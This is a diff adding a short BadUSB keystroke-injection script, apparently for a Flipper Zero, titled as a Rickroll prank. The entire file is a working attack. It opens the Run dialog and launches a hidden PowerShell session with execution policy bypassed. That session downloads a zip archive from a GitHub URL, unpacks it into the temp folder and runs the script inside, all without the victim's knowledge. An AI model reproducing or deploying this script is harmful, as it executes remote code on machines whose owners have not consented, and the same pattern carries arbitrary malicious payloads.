@@ -1,0 +1,9 @@
+REM Rickroll via CMD + PowerShell
+DELAY 2000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING powershell -WindowStyle Hidden -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $D = Join-Path $env:TEMP 'rr'; New-Item -ItemType Directory -Force -Path $D | Out-Null; Invoke-WebRequest 'https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/raw/main/Payloads/Flip-ADV-RickRoll/rr.zip' -OutFile (Join-Path $D 'rr.zip'); Expand-Archive -Path (Join-Path $D 'rr.zip') -DestinationPath $D -Force; & (Join-Path $D 'rr.ps1')"
+ENTER
